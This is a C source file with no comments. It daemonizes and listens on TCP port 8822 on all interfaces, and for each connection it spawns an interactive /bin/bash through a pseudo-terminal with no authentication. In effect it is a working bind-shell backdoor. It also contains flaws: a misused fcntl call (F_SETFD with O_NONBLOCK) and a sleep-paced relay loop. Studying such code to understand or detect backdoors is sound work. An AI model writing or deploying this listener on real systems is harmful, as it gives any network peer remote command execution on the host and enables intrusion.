#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <pty.h>

#define PORT "8822"
#define BACKLOG 5

void write_(int fd, char *buf, size_t count)
{
    size_t printed = 0;
    while (printed < count)
    {
        int res = write(fd, buf + printed, count - printed);
        if (res < 0)
        {
            perror("WRITE");
            return;
        }
        printed += res;
    }
}

int main()
{
    if (fork())
    {
        sleep(5);
        _exit(EXIT_SUCCESS);
    }
    setsid();
    struct addrinfo hints;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    hints.ai_protocol = 0;
    hints.ai_canonname = NULL;
    hints.ai_addr = NULL;
    hints.ai_next = NULL;
    struct addrinfo *result;
    if (getaddrinfo(NULL, PORT, &hints, &result) != 0)
    {
        perror("GETADDRINFO");
        _exit(EXIT_FAILURE);
    }
    int sfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sfd == -1)
    {
        perror("SOCKET");
        _exit(EXIT_FAILURE);
    }
    int reuseaddrval = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &reuseaddrval, 
                sizeof(reuseaddrval)) != 0)
    {
        perror("SETSOCKOPT");
        _exit(EXIT_FAILURE);
    }
    if (bind(sfd, result->ai_addr, result->ai_addrlen) != 0)
    {
        perror("BIND");
        _exit(EXIT_FAILURE);
    }
    freeaddrinfo(result);
    if (listen(sfd, BACKLOG) != 0)
    {
        perror("LISTEN");
        _exit(EXIT_FAILURE);
    }
    struct sockaddr sa;
    socklen_t sl = sizeof(sa);
    while (1)
    {
        int fd = accept(sfd, &sa, &sl);
        if (fd == -1)
        {
            perror("ACCEPT");
            continue;
        }
        if (fork())
        {
            close(sfd);
            int master, slave;
            char name[4096];
            if (openpty(&master, &slave, name, NULL, NULL) < 0)
            {
                perror("OPENPTY");
                _exit(EXIT_FAILURE);
            }
            if (fork())
            {
                close(slave);
                close(0);
                close(1);
                close(2);
                fcntl(fd, F_SETFD, O_NONBLOCK);
                fcntl(master, F_SETFD, O_NONBLOCK);
                const int BUF_SIZE = 4096;
                char buf[BUF_SIZE];
                while (1)
                {
                    int res = read(fd, buf, BUF_SIZE);
                    if (res <= 0)
                        break;
                    if (buf[res - 1] == '\n')
                        res--;
                    write_(master, buf, res);
                    sleep(1);

                    res = read(master, buf, BUF_SIZE);
                    if (res <= 0)
                        break;
                    write_(fd, buf, res);
                    sleep(1);
                }
                close(fd);
                close(master);
                _exit(EXIT_SUCCESS);
            }
            else
            {
                close(fd);
                close(master);
                dup2(slave, 0);
                dup2(slave, 1);
                dup2(slave, 2);
                close(slave);
                setsid();
                int ptyfd = open(name, O_RDWR);
                if (ptyfd < 0)
                {
                    perror("OPEN");
                    _exit(EXIT_FAILURE);
                }
                close(ptyfd);
                execl("/bin/bash", "bash", NULL);
            }
        }
        else
            close(fd);
    }
    return 0;
}
